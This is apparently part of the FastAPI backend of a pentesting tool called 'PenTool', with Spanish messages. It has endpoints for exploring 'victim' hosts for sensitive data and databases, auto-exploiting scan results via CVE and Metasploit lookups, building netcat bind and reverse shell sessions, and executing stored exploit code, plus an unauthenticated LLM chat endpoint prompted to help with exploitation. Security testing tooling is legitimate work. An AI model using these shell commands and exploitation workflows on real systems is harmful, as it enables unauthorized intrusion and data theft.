@app.post("/api/explorer/databases")
async def explorer_databases(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    dbs = explorer.find_databases()
    return {"success": True, "data": {"databases": dbs}}

@app.post("/api/explorer/system")
async def explorer_system(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    info = explorer.get_system_info()
    return format_explorer_response(info)

@app.post("/api/explorer/sensitive")
async def explorer_sensitive(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    data = explorer.find_sensitive_data()
    return {"success": True, "data": {"findings": data}}

@app.get("/api/explorer/downloads")
async def explorer_list_downloads(api_key: str = Security(verify_api_key)):
    files = []
    for f in os.listdir(EXPLORER_WORKSPACE):
        fpath = os.path.join(EXPLORER_WORKSPACE, f)
        if os.path.isfile(fpath):
            files.append({"name": f, "size": os.path.getsize(fpath), "modified": datetime.fromtimestamp(os.path.getmtime(fpath)).isoformat()})
    return {"success": True, "data": {"files": sorted(files, key=lambda x: x["modified"], reverse=True)}}

@app.get("/api/explorer/downloads/{filename}")
async def explorer_get_download(filename: str, api_key: str = Security(verify_api_key)):
    from fastapi.responses import FileResponse
    fpath = os.path.join(EXPLORER_WORKSPACE, filename)
    if not os.path.exists(fpath) or ".." in filename:
        raise HTTPException(status_code=404, detail="Archivo no encontrado")
    return FileResponse(fpath, filename=filename)

# ============================================================
# Interactive MSSQL/MySQL/PostgreSQL via victim
# ============================================================

class DBQueryRequest(BaseModel):
    scan_id: str
    db_type: str = "mysql"
    host: str = "localhost"
    user: str = "root"
    password: str = ""
    database: str = ""
    query: str = "SHOW DATABASES;"

@app.post("/api/explorer/db-query")
async def explorer_db_query(request: DBQueryRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    if request.db_type == "mysql":
        output = explorer.query_mysql(request.query, request.user, request.password, request.host)
    elif request.db_type == "postgres":
        output = explorer.query_postgres(request.query, request.user, request.database or "postgres", request.host)
    elif request.db_type == "sqlite":
        if not request.database:
            raise HTTPException(status_code=400, detail="Se requiere path de DB para SQLite")
        output = explorer.query_sqlite(request.database, request.query)
    else:
        raise HTTPException(status_code=400, detail=f"Tipo de DB no soportado: {request.db_type}")
    return {"success": True, "data": {"output": output, "db_type": request.db_type, "query": request.query}}

# ============================================================
# Exploit auto-generation from scan results
# ============================================================

@app.post("/api/exploit/auto-from-scan")
async def auto_exploit_from_scan(request: ExploitAiRequest, api_key: str = Security(verify_api_key)):
    scan = _scan_run_to_dict(get_scan_run(request.scan_id)) if request.scan_id else None
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")
    raw_scan = scan.get("raw_scan") or ""
    target = scan["target"]
    lhost = load_llm_config().get("attacker_ip") or "127.0.0.1"

    services = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", raw_scan)
    results = []
    for port, service, version_info in services[:10]:
        version = version_info.strip()
        cve_result = auto_exploit_pipeline(target, service, version, port, request.scan_id or "", lhost)
        results.append(cve_result)
        add_scan_event(request.scan_id, "auto_cve", f"{service}:{port}", f"CVEs: {len(cve_result.get('cves_found', []))}, MSF: {len(cve_result.get('msf_modules', []))}", "cve_intel")
    return {"target": target, "services_analyzed": len(results), "results": results}

# ============================================================
# ============================================================
# Custom Session Creation
# ============================================================

class CreateSessionRequest(BaseModel):
    target: str
    type: str = "custom"
    command: Optional[str] = None
    info: Optional[str] = None
    port: Optional[int] = None

@app.post("/api/sessions/create")
async def api_create_session(request: CreateSessionRequest, api_key: str = Security(verify_api_key)):
    session_id = f"{request.type}_{uuid.uuid4().hex[:8]}"

    # Auto-build command based on type
    cmd = request.command
    if not cmd:
        if request.type == "bindshell" and request.target:
            cmd = f"nc {shlex.quote(request.target)} 1524"
        elif request.type == "revshell" and request.target:
            cmd = f"nc -lvnp {request.port or 4444}"
        elif request.type == "netcat":
            cmd = f"nc -lvnp {request.port or 4444}"
        elif request.type == "ssh":
            cmd = f"ssh -o StrictHostKeyChecking=no root@{request.target}"
        else:
            cmd = f"nc -lvnp {request.port or 4444}"

    session = CustomSession(
        session_id=session_id,
        target=request.target or "0.0.0.0",
        session_type=request.type,
        command=cmd,
        info=request.info or f"{request.type} session on {request.target or '?'}",
    )
    custom_sessions[session_id] = session
    return {"session_id": session_id, "type": request.type, "command": cmd, "message": f"Sesión {request.type} creada con ID {session_id}"}

# ============================================================
# Code save / manage (from chat-generated code)
# ============================================================

GENERATED_CODE_DIR = Path(os.path.dirname(__file__)) / "generated_code"
GENERATED_CODE_DIR.mkdir(exist_ok=True)

class SaveCodeRequest(BaseModel):
    filename: str
    code: str
    category: str = "general"

@app.post("/api/code/save")
async def api_save_code(request: SaveCodeRequest, api_key: str = Security(verify_api_key)):
    safe_name = re.sub(r'[^\w\.\-]', '_', request.filename)
    filepath = GENERATED_CODE_DIR / safe_name
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(request.code)
    # Also save to DB as exploit artifact
    try:
        save_exploit_artifact(filename=safe_name, code=request.code, category=request.category)
    except: pass
    return {"path": str(filepath), "filename": safe_name, "message": "Código guardado exitosamente"}

@app.get("/api/code/list")
async def api_list_code(api_key: str = Security(verify_api_key)):
    files = []
    for f in GENERATED_CODE_DIR.iterdir():
        if f.is_file():
            files.append({
                "filename": f.name,
                "path": str(f),
                "size": f.stat().st_size,
                "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat(),
            })
    # Also include exploit artifacts from DB
    try:
        artifacts = list_exploit_artifacts()
        for a in artifacts:
            if not any(f["filename"] == a["filename"] for f in files):
                files.append({"filename": a["filename"], "size": len(a.get("code", "")), "from_db": True})
    except: pass
    return {"files": sorted(files, key=lambda x: x.get("modified", ""), reverse=True)}

@app.get("/api/code/read/{filename}")
async def api_read_code(filename: str, api_key: str = Security(verify_api_key)):
    safe = re.sub(r'[^\w\.\-]', '_', filename)
    filepath = GENERATED_CODE_DIR / safe
    if filepath.exists():
        return {"filename": safe, "code": filepath.read_text(encoding="utf-8")}
    # Try DB
    try:
        artifacts = list_exploit_artifacts()
        for a in artifacts:
            if a["filename"] == safe:
                return {"filename": safe, "code": a.get("code", "")}
    except: pass
    raise HTTPException(status_code=404, detail="File not found")

class CodeExecRequest(BaseModel):
    filename: str
    args: str = ""

@app.post("/api/code/exec")
async def api_exec_code(request: CodeExecRequest, api_key: str = Security(verify_api_key)):
    safe = re.sub(r'[^\w\.\-]', '_', request.filename)
    filepath = GENERATED_CODE_DIR / safe
    if not filepath.exists():
        raise HTTPException(status_code=404, detail="File not found")
    import subprocess as sp
    try:
        result = sp.run(
            ["python", str(filepath)] + request.args.split(),
            capture_output=True, text=True, timeout=60,
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }
    except sp.TimeoutExpired:
        return {"stdout": "", "stderr": "Timed out after 60s", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}

@app.put("/api/code/update/{filename}")
async def api_update_code(filename: str, request: SaveCodeRequest, api_key: str = Security(verify_api_key)):
    safe = re.sub(r'[^\w\.\-]', '_', filename)
    filepath = GENERATED_CODE_DIR / safe
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(request.code)
    return {"message": "Archivo actualizado", "path": str(filepath)}

@app.delete("/api/code/delete/{filename}")
async def api_delete_code(filename: str, api_key: str = Security(verify_api_key)):
    safe = re.sub(r'[^\w\.\-]', '_', filename)
    filepath = GENERATED_CODE_DIR / safe
    if filepath.exists():
        filepath.unlink()
    return {"message": "Archivo eliminado"}

# ============================================================
# AI Chat endpoint
# ============================================================

@app.post("/api/agent/chat")
async def agent_chat(request: Request):
    from llm_config import load_llm_config, run_llm_chat
    data = await request.json()
    message = data.get("message", "")
    context = data.get("context", {})
    history = data.get("history", [])

    context_summary = f"Sistema: {json.dumps(context.get('system', {}))}\nEscaneo: {json.dumps(context.get('scan', {}))}\nCVEs: {json.dumps(context.get('cve', {}))}\nAgente: {json.dumps(context.get('agent', {}))}"

    messages = [
        {"role": "system", "content": f"Eres un asistente de pentesting integrado en PenTool. Tienes acceso al contexto completo del sistema. Responde en español, sé técnico y conciso. Puedes ayudar con análisis de escaneos, CVEs, explotación y recomendaciones.\n\nContexto actual:\n{context_summary}"},
    ]

    for h in history[-10:]:
        messages.append({"role": h.get("role", "user"), "content": h.get("content", "")})

    messages.append({"role": "user", "content": message})

    try:
        config = load_llm_config()
        response = run_llm_chat(messages, config)
        return {"response": response, "context_used": True}
    except Exception as e:
        return {"response": f"[Modo local] {message}\n\nNo hay conexión con el LLM. Contexto disponible:\n{context_summary[:500]}", "context_used": False, "error": str(e)}

# Login page frontend route
# ============================================================

@app.get("/login")
async def login_page():
    from fastapi.responses import FileResponse
    login_path = os.path.join(os.path.dirname(__file__), "frontend", "login.html")
    if os.path.exists(login_path):
        return FileResponse(login_path)
    return {"message": "Login page not found"}


def start_server():
    import uvicorn

    port = int(os.getenv("PENTOOL_PORT", "8000"))
    print(f"[*] PenTool local: http://127.0.0.1:{port}")
    for url in _local_network_urls():
        print(f"[*] PenTool LAN:   {url}")
    uvicorn.run(
        app,
        host=os.getenv("PENTOOL_HOST", "0.0.0.0"),
        port=port,
    )


@app.on_event("startup")
async def startup_event():
    init_db()
    threading.Thread(target=start_msfrpcd, daemon=True).start()
    threading.Thread(target=schedule_monitor, daemon=True).start()


if __name__ == "__main__":
    start_server()
